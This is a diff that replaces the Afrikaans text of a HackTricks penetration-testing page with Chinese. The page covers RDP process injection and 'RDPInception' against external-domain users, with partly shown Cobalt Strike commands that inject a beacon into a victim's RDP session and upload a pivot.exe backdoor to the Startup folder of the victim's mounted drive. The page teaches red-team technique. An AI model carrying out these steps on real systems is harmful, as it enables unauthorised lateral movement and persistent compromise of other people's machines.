@@ -15,11 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## RDP Proses Inspuiting
+## RDP 进程注入
 
-As die **eksterne groep** **RDP-toegang** tot enige **rekenaar** in die huidige domein het, kan 'n **aanvaller** daardie rekenaar **kompromitteer en op hom wag**.
+如果 **外部组** 对当前域中的任何 **计算机** 具有 **RDP 访问权限**，则 **攻击者** 可以 **入侵该计算机并等待他**。
 
-Sodra daardie gebruiker via RDP toegang verkry het, kan die **aanvaller na daardie gebruiker se sessie pivot** en sy toestemmings in die eksterne domein misbruik.
+一旦该用户通过 RDP 访问，**攻击者可以转移到该用户的会话** 并滥用其在外部域中的权限。
 ```powershell
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -43,13 +43,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Check **ander maniere om sessies te steel met ander gereedskap** [**op hierdie bladsy.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+检查 **其他工具窃取会话的其他方法** [**在此页面。**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-As 'n gebruiker via **RDP toegang tot 'n masjien** kry waar 'n **aanvaller** op hom **wag**, sal die aanvaller in staat wees om 'n **beacon in die RDP-sessie van die gebruiker** te **injekteer** en as die **slagoffer sy skyf gemonteer het** toe hy via RDP toegang verkry, kan die **aanvaller dit toegang**.
+如果用户通过 **RDP 访问一台机器**，而 **攻击者** 正在 **等待** 他，攻击者将能够 **在用户的 RDP 会话中注入一个信标**，如果 **受害者在通过 RDP 访问时挂载了他的驱动器**，**攻击者可以访问它**。
 
-In hierdie geval kan jy net die **slagoffer se** **oorspronklike rekenaar** **kompromitteer** deur 'n **backdoor** in die **opstartgids** te skryf.
+在这种情况下，你可以通过在 **启动文件夹** 中写入一个 **后门** 来 **妥协** **受害者** 的 **原始计算机**。
 ```powershell
 # Wait til someone logs in:
 net logons
@@ -82,16 +82,16 @@ beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start
 beacon> upload C:\Payloads\pivot.exe
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
